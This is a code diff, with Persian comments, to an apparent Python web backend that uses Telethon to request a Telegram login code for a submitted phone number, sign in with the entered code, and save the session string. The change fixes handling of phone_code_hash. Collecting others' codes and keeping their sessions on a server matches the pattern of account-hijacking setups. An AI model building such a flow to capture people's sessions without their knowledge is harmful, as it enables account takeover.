@@ -47,7 +47,6 @@ def request_code():
     sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
     
     try:
-        # ارسال کد با روش جدید
         loop.run_until_complete(send_code(session_id, phone))
     except Exception as e:
         logging.error(f"Error in request_code: {e}")
@@ -84,17 +83,16 @@ def verify_code():
 # ============================================================
 async def send_code(session_id, phone):
     try:
-        # ✅ ساخت کلاینت با session مخصوص
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        # ✅ ارسال درخواست کد
-        await client.send_code_request(phone)
+        # ارسال درخواست کد
+        result = await client.send_code_request(phone)
         
-        # ذخیره کلاینت برای مرحله بعد
+        # ذخیره phone_code_hash برای مرحله بعد
         sessions[session_id]['client'] = client
+        sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
-        sessions[session_id]['phone'] = phone  # ذخیره شماره برای مرحله بعد
         
         logging.info(f"✅ Code sent to: {phone}")
         
@@ -114,8 +112,15 @@ async def verify_session(session_id, phone, code):
         return False
     
     try:
-        # ✅ روش درست: تایید کد با شماره
-        await client.sign_in(phone, code)
+        # ✅ روش درست: استفاده از phone_code_hash
+        phone_code_hash = session.get('phone_code_hash')
+        
+        if phone_code_hash:
+            # لاگین با کد و هش
+            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        else:
+            # روش جایگزین: لاگین فقط با کد
+            await client.sign_in(code=code)
         
         # دریافت سشن
         session_string = client.session.save()
@@ -133,7 +138,8 @@ async def verify_session(session_id, phone, code):
         logging.error(f"❌ Verification error: {e}")
         
         # اگر کد اشتباه بود
-        if 'code' in str(e).lower() or 'invalid' in str(e).lower() or 'phone' in str(e).lower():
+        error_msg = str(e).lower()
+        if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
             return False
         raise
 
